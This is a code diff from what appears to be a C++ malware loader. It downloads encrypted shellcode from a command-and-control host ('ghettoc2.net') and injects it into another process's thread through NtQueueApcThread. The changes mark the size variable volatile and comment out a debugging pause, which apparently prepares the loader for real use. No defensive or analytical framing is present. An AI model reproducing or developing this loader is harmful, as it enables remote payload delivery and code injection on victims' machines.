@@ -170,7 +170,7 @@ int main()
 #endif
     std::vector<BYTE> shellcode = Download(L"ghettoc2.net\0", L"/c2/9d6cbdecabefe19dcf2e4b5469c9c5430ef450bd/tools/loader.enc\0");
 
-	unsigned long shellcode_size = (unsigned long)(shellcode.size());
+	volatile unsigned long shellcode_size = (unsigned long)(shellcode.size());
 
 #ifdef DEBUGGING
     printf("Finished download, shellcode size is %d\n", shellcode_size);
@@ -321,8 +321,8 @@ int main()
 #endif
     }
 
-	fprintf(stderr, "Memory protected, check with processhacker\n");
-	getchar();
+	//fprintf(stderr, "Memory protected, check with processhacker\n");
+	//getchar();
 
     ntstatus = NtQueueApcThread(process_info->hThread, PKNORMAL_ROUTINE(start_address), start_address, NULL, NULL);
     if (!NT_SUCCESS(ntstatus)) {
